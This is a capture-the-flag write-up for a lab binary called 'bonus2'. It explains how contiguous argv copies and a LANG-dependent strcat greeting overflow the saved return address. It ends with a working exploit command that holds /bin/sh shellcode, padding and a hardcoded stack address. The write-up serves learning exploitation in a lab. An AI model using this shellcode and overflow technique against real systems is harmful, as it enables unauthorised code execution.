# BONUS2

## EXPLANATIONS

### BINARY BEHAVIOR

- program takes two arguments
  - stores argv1 first 40 characters into a stack buffer (buf1)
  - stores argv2 first 32 characters into buf1 + 40
    - (contiguous, no \0 between the argv1 and argv2 storage)
- random argv1 string (length >= 40) and argv2 (length >= 32) leads to a segmentation fault

  - => sEIP must be overwritten

- retrieves value of LANG env variable and sets a flag accordingly

  - if "fi" => flag = 1
  - if "nl" => flag = 2
  - else => flag = 0

- greetuser function will modify the greeting string depending on the flag value

  - 0 => "Hello "
  - 1 => "Hyvää päivää "
  - 2 => "Goedemiddag! "

- a strcat is performed on greeting string + buf
  - when greeting string is "Hello ", sEIP is partially overwritten with buf content.

### EXPLOIT STRATEGY

- change the LANG env variable to fi so that strcat fully overwrites sEIP of greetuser function
- change sEIP stack value to start of buf
  - => with buf containing our shellcode
- To be able to perform the exploit on a stack buffer, we aligned GDB and noGDB stack addresses.

### RUN COMMAND

```
python -c "print('\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + 'A' * 15)" > /tmp/argv1_string
python -c "print('B' * 18 + '\xbf\xff\xfc\xf2'[::-1])" > /tmp/argv2_string
export LANG=fi
env - PWD=$PWD LANG=$LANG /home/user/bonus2/bonus2 $(cat /tmp/argv1_string) $(cat /tmp/argv2_string)
```
